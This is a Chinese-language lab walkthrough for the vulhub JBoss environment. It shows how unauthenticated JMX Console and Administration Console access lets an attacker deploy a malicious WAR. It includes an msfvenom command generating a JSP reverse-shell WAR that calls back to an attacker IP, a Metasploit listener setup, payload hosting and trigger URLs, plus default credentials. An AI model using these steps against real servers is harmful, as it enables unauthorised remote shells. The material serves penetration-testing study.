# JBoss未授权访问

### 0x00 环境搭建

使用vulhub的CVE-2017-12149漏洞环境`jboss/CVE-2017-12149`

![image-20230412153049744](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412153049744.png)

首次执行时会有1~3分钟时间初始化，初始化完成后访问`http://your-ip:8080/`即可看到JBoss默认页面。

利用条件：

>  知道账户名密码，登录的账户密码为`admin/vulhub`，也可以进行爆破获取

### 0x01 JBoss6.x JMX Console未授权访问

1、kali生成木马，并打开msf监听5555端口

```shell
msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.12.152 lport=5555 -f war > jboss_sh.war
```

```shell
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload java/jsp_shell_reverse_tcp 
msf6 exploit(multi/handler) > set lhost 192.168.12.152
msf6 exploit(multi/handler) > set lport 5555
msf6 exploit(multi/handler) > run
```

2、开启http服务

```
python -m http.server 8080
```

3、JMX Console ——> jboss.system ——> service=MainDeployer

在其中任意deploy部署war包，输入url地址就好

```
http://192.168.12.152:8080/jboss_sh.war
```

![image-20230412153603840](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412153603840.png)

4、点击invoke即可部署成功

5、访问以下地址即可成功反弹shell

```
http://192.168.12.130:8080/jboss_sh/
```

![image-20230412153904812](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412153904812.png)



### 0x02 JBoss Administration Console未授权访问

1、重新启动靶场环境重复上面第一个步骤

2、访问Administration Console，登录用户`admin/vulhub`

3、访问Web Application (WAR)s ——> Add a new resource，上传准备好的木马war包

![image-20230412160244784](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412160244784.png)

4、上传成功后访问以下地址即可成功反弹shell

```
http://192.168.12.130:8080/jboss_sh/
```

![image-20230412160355216](https://cdn.jsdelivr.net/gh/lcyunkong/images_map@main/img/image-20230412160355216.png)